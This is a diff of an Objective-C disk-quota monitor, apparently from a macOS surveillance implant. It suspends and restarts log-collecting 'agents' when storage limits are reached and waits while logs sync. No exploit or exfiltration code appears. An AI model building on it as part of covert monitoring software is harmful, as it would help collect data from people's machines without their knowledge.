@@ -7,12 +7,11 @@
 //
 
 #import "RCSMDiskQuota.h"
+#import "RCSMTaskManager.h"
+#import "RCSMEvents.h"
 
 #import "RCSMDebug.h"
 #import "RCSMLogger.h"
-
-NSString *RCSMaxLogQuotaReached = @"RCSMaxLogQuotaReached";
-NSString *RCSGlobalQuotaReached = @"RCSGlobalQuotaReached";
 
 static RCSMDiskQuota *sharedDiskQuota = nil;
 
@@ -30,6 +29,8 @@ typedef struct  {
 
 
 @implementation RCSMDiskQuota
+
+@synthesize mMaxQuotaTriggered;
 
 + (id)allocWithZone: (NSZone *)aZone
 {
@@ -146,16 +147,18 @@ typedef struct  {
 #ifdef DEBUG_QUOTA
   infoLog(@"Disk size %llu, free disk %llu, used quota %u", mDiskSize, mFreeDisk, mUsed);
 #endif
-
+                                             
   // running quota monitor thread
-  [NSThread detachNewThreadSelector:@selector(checkQuotas) toTarget:self withObject:nil];
+  [NSThread detachNewThreadSelector:@selector(checkQuotas) 
+                           toTarget:self withObject:nil];
   
   [pool release];
 }
 
 - (void)resetEventQuotaParam
 {
-  mMaxLogQuota = 0;
+  mMaxLogQuota = 0; 
+  mMaxQuotaTriggered = FALSE;
   
   if (mStartAction) 
     {
@@ -185,7 +188,7 @@ typedef struct  {
       
 #ifdef DEBUG_QUOTA
     infoLog(@"config: mMaxLogQuota %lu, mStartAction %@, mStopAction %@", 
-    params->disk_quota, mStartAction, mStopAction);
+    mMaxLogQuota, mStartAction, mStopAction);
 #endif
     }
     
@@ -230,83 +233,79 @@ typedef struct  {
   
   while (TRUE) 
     {
-      sleep(3);
+      sleep(1);
+    
+#ifdef DEBUG_QUOTA
+    infoLog(@"mUsed [%lu] mMaxLogQuota [%lu] mMaxGlobalLogSize [%lu] mMaxQuotaTriggered %d", 
+            mUsed, mMaxLogQuota, mMaxGlobalLogSize, mMaxQuotaTriggered);
+#endif
       
-      // Check and trigger quota events in an out
-      if (mMaxLogQuota > 0 && !mMaxQuotaTriggered &&  (mUsed > mMaxLogQuota))
+      // check quotas till logs are flushed
+      if ([[RCSMTaskManager sharedInstance] mIsSyncing])
+          continue;
+          
+#ifdef DEBUG_QUOTA
+    infoLog(@"checking... %d", (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  mUsed > mMaxLogQuota));
+#endif   
+
+       // Check and trigger quota events in an out
+      if (mMaxLogQuota > 0 && mMaxQuotaTriggered == FALSE &&  (mUsed > mMaxLogQuota))
         {
 #ifdef DEBUG_QUOTA
           infoLog(@"mMaxQuotaTriggered %ld [%ld]", mMaxLogQuota, mUsed);
 #endif
           mMaxQuotaTriggered = TRUE;
-          [self sendQuotaNotify: RCSMaxLogQuotaReached withObject:(id)mStartAction];
         }
-        
-      if (mMaxLogQuota > 0 && mMaxQuotaTriggered && (mUsed < mMaxLogQuota))
+      
+      sleep(1);
+          
+      if (mMaxLogQuota > 0 && mMaxQuotaTriggered == TRUE && (mUsed < mMaxLogQuota))
         {
 #ifdef DEBUG_QUOTA
         infoLog(@"mMaxQuota untriggered %ld [%ld]", mMaxLogQuota, mUsed);
 #endif
           mMaxQuotaTriggered = FALSE;
-          [self sendQuotaNotify: RCSMaxLogQuotaReached withObject:(id)mStopAction];
         }
        
       // check and set/reset flags for global conf vars
       NSDictionary *fsAtt = [[NSFileManager defaultManager] attributesOfFileSystemForPath: @"/" error: nil];
       mFreeDisk = [[fsAtt objectForKey: NSFileSystemFreeSize] longLongValue];
+
+      sleep(1);
+
+      if (mMaxGlobalQuotaReached == FALSE && 
+          ((mFreeDisk < mMinGlobalFreeDisk) || (mUsed > mMaxGlobalLogSize)) )
+        {
+          mMaxGlobalQuotaReached = TRUE;
+
+          // Quota disk exceded to taskManager: stop all agents activity
+          [[RCSMTaskManager sharedInstance] suspendAgents];
+          
+#ifdef DEBUG_QUOTA
+          infoLog(@"mMaxGlobalQuotaReached exceeded [%lu > %lu]", mUsed, mMaxGlobalLogSize);
+#endif
+        }
+       
+      sleep(1);
       
-      @synchronized(self)
-      {
-        if (mMaxGlobalQuotaReached == FALSE && 
-            ((mFreeDisk < mMinGlobalFreeDisk) || (mUsed > mMaxGlobalLogSize)) )
-          {
-            mMaxGlobalQuotaReached = TRUE;
-
-            // Quota disk exceded to taskManager: stop all agents activity
-            [self sendQuotaNotify: RCSGlobalQuotaReached withObject:stopAllAgents];
-            
+      if (mMaxGlobalQuotaReached == TRUE && 
+          ((mFreeDisk > mMinGlobalFreeDisk) && (mUsed < mMaxGlobalLogSize)) )
+        {
+          mMaxGlobalQuotaReached = FALSE;
+          
+          // send quota disk now available to taskManager: renable all agents
+          [[RCSMTaskManager sharedInstance] restartAgents];
+          
 #ifdef DEBUG_QUOTA
-            infoLog(@"mMaxGlobalQuotaReached exceeded [%lu > %lu]", mUsed, mMaxGlobalLogSize);
+          infoLog(@"mMaxGlobalQuotaReached available [%lu > %lu]", mUsed, mMaxGlobalLogSize);
 #endif
-          }
-
-        if (mMaxGlobalQuotaReached == TRUE && 
-            ((mFreeDisk > mMinGlobalFreeDisk) && (mUsed < mMaxGlobalLogSize)) )
-          {
-            mMaxGlobalQuotaReached = FALSE;
-            
-            // send quota disk now available to taskManager: renable all agents
-            [self sendQuotaNotify: RCSGlobalQuotaReached withObject:startAllAgents];
-            
-#ifdef DEBUG_QUOTA
-            infoLog(@"mMaxGlobalQuotaReached available [%lu > %lu]", mUsed, mMaxGlobalLogSize);
-#endif
-          }
-      } 
+        }
+       
     }
       
   [stopAllAgents release];
   [startAllAgents release];
   
-  [pool release];
-}
-
-- (void)sendQuotaNotify:(NSString*)aName 
-             withObject:(id)aObject
-{
-  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
-  
-  if (aObject == nil)
-    return;
-  
-  NSNotification *aNotify = [NSNotification notificationWithName: aName object:aObject];
-  
-  [[NSNotificationCenter defaultCenter] postNotification: aNotify];
-
-#ifdef DEBUG_QUOTA
-  infoLog(@"send a new notification %@", aName);
-#endif
-
   [pool release];
 }
 
